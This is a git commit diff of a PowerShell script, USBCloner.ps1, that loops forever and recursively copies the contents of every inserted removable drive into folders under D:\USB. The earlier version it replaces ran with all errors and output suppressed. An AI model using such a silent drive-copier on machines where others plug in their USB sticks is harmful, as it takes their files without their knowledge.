e8c15cf1e5bc4d5397569eb12b062586356680f3
GamehunterKaan <68380968+GamehunterKaan@users.noreply.github.com>
2022-03-20 21:32:19 +0300

    Update USBCloner.ps1

--- USBCloner.ps1
+++ USBCloner.ps1
@@ -1,17 +1,19 @@
+mkdir "D:\USB"
+Set-Location "D:\USB"
 while ($true){
     if ((get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter -ne $null) {
-        $DriveLetter = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
-        $DrivePath = (get-psdrive | where-object {$_.Name -eq $DriveLetter}).Root
-        $Label = (get-volume | where-object {$_.DriveLetter -eq $DriveLetter}).FileSystemLabel
-        if ((Test-Path $pwd\$Label -PathType Container) -ne $true){
-            mkdir $Label -ErrorAction SilentlyContinue | Out-Null
-        }
-        Set-Location $Label -ErrorAction SilentlyContinue | Out-Null
-        Copy-Item -Path "$DrivePath\*" -Destination "$pwd" -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
-        Set-Location .. -ErrorAction SilentlyContinue | Out-Null
-        Start-Sleep -Seconds 600 -ErrorAction SilentlyContinue | Out-Null
+        $Driveletters = (get-volume | where-Object {$_.drivetype -eq "removable"}).DriveLetter
+        $i=0
+        foreach ($drive in $Driveletters) {
+            $DrivePath = (get-psdrive | where-object {$_.Name -eq $DriveLetters[$i]}).Root
+            $Label = (get-volume | where-object {$_.DriveLetter -eq $DriveLetters[$i]}).FileSystemLabel
+            mkdir $Label
+            Robocopy.exe $DrivePath $Label /E  
+            $i++
+        }$i=0
+        Start-Sleep -Seconds 10
     }
     else {
-        Start-Sleep -Seconds 60 -ErrorAction SilentlyContinue | Out-Null
+        Start-Sleep -Seconds 5
     }
 }
